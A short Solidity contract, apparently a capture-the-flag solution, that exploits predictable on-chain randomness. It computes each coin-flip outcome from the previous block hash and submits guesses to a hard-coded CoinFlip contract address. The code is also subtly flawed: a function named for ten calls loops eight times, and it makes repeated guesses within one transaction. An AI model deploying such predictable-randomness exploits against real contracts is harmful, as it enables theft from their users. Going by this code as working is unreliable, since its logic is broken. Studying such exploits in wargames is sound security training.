// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess)  external returns (bool);
}



contract Caller {
    CoinFlip myInterface = CoinFlip(0xBf20cBFAEb736b858D7a8Da99Dd8Fc14B9468D81);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    

    function callMyFunction() public returns (bool) {
      uint256 blockValue = uint256(blockhash(block.number - 1));
      uint256 coinFlip = blockValue / FACTOR;
      bool side = coinFlip == 1 ? true : false;
      myInterface.flip(side);
      return side;
    }
    function callMyFunction10Times() public returns(bool) {
      bool rand;
       for(int i=0;i<8;i++) {
            rand = callMyFunction();
       }
       return rand;
    }

}